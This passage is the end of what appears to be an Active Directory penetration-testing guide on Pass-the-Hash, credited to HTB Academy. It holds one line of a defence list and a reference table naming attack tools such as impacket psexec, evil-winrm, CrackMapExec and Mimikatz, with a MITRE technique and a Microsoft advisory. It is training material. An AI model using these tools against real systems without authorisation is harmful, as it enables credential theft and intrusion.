│  5. Privileged Access Workstations (PAWs) for admin activity      │
└────────────────────────────────────────────────────────────────────┘
```

---

## 17. References

| Resource | Description |
|---|---|
| [MITRE T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Use Alternate Authentication Material: Pass the Hash |
| [impacket psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) | Remote execution via service creation |
| [impacket wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) | Remote execution via WMI |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | WinRM shell with hash auth |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | SMB/WinRM/RDP validation |
| [Mimikatz sekurlsa::pth](https://github.com/gentilkiwi/mimikatz) | Windows-side hash injection |
| [MS KB2871997](https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649) | LSASS credential protection update |

---

*Source: HTB Academy — Active Directory Penetration Tester Path 2024*